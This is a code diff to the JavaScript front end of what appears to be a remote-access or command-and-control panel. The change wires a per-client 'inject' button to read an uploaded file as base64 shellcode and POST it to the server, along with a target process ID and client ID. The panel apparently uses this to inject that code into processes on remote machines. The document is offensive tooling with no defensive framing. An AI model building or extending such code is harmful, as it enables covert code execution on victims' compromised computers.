@@ -252,7 +252,7 @@ function InjectOption(e, id){
             icon.style.color = '#0f0';
           } else {
             icon.addEventListener('click', function() {
-              SendInjectByPid(i[1],icon);
+              SendInjectByPid(i[1],icon, id);
             });
           }
 
@@ -265,10 +265,33 @@ function InjectOption(e, id){
 }
 
 
-function SendInjectByPid(pid,icon){
-  UploadProcessToInject();
-  icon.style.color = '#0f0';
+function SendInjectByPid(pid,icon, id){
+  UploadProcessToInject().then(shellonbase => {
+    return fetch("/send_message", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({message:{command: "aea87b24517d08c8ff13601406a0202e",shellonbase:shellonbase, targetPid:pid}, id: id})
+    })
+    .then(response => {
+      if (!response.ok) {
+        throw new Error(`HTTP error! status: ${response.status}`);
+      }
+      return response.json();
+    })
+    .then(res => {
+      console.log(res)
+      if(res.message){
+        icon.style.color = '#0f0';
+      }
+      else{
+        icon.style.color = 'red';
+      }
+    })
+  });
 }
+
 
 function DisplaySettings(clientDiv, id) {
   let menu = document.getElementById('settings-menu');
@@ -377,10 +400,10 @@ function toggleAll(exclude){
   });
 }
 
-
-function UploadProcessToInject(){
-    let mainDiv = document.getElementById("UploadFileDialogBox")
-    mainDiv.style.display = 'block'
+function UploadProcessToInject() {
+  return new Promise((resolve, reject) => {
+    let mainDiv = document.getElementById("UploadFileDialogBox");
+    mainDiv.style.display = 'block';
     let container = document.querySelector('.UploadFileContainer');
     let fileList = document.getElementById('SelectedFileName');
     let fileUpload = document.getElementById('file_uploadOption');
@@ -390,46 +413,52 @@ function UploadProcessToInject(){
         if (files.length > 0) {
             fileList.textContent = files[files.length - 1].name;
         }
-    }fileUpload.addEventListener('change', updateFileList);
-
-  container.addEventListener('dragover', function(e) {
-    e.preventDefault();
-    container.classList.add('dragover');
-  });
-
-  container.addEventListener('dragleave', function(e) {
-    e.preventDefault();
-    container.classList.remove('dragover');
-  });
-
-  container.addEventListener('drop', function(e) {
-    e.preventDefault();
-    container.classList.remove('dragover');
-    fileUpload.files = e.dataTransfer.files;
-    updateFileList();
-  });
-
-  document.querySelector('.UploadFileBtn').addEventListener('click', function() {
-    let files = fileUpload.files;
-    if (files.length === 0) {
-        console.log("No files selected");
-        return;
     }
-    mainDiv.style.display = 'none'
-    let file = files[0];
-    let reader = new FileReader();
 
-    reader.onload = function(event) {
-        let base64String = event.target.result.split(',')[1];
-        console.log(base64String);
-    };
+    fileUpload.addEventListener('change', updateFileList);
 
-    reader.onerror = function(event) {
-        console.log("Error reading file: " + event.target.error);
-    };
+    container.addEventListener('dragover', function(e) {
+      e.preventDefault();
+      container.classList.add('dragover');
+    });
 
-    reader.readAsDataURL(file);
+    container.addEventListener('dragleave', function(e) {
+      e.preventDefault();
+      container.classList.remove('dragover');
+    });
+
+    container.addEventListener('drop', function(e) {
+      e.preventDefault();
+      container.classList.remove('dragover');
+      fileUpload.files = e.dataTransfer.files;
+      updateFileList();
+    });
+
+    document.querySelector('.UploadFileBtn').addEventListener('click', function() {
+      let files = fileUpload.files;
+      if (files.length === 0) {
+          console.log("No files selected");
+          return;
+      }
+      mainDiv.style.display = 'none'
+      let file = files[0];
+      let reader = new FileReader();
+
+      reader.onload = function(event) {
+          let base64String = event.target.result.split(',')[1];
+          console.log(base64String);
+          resolve(base64String); 
+      };
+
+      reader.onerror = function(event) {
+          console.log("Error reading file: " + event.target.error);
+          reject(event.target.error); 
+      };
+
+      reader.readAsDataURL(file);
+    });
   });
 }
+
 
 displayClients()
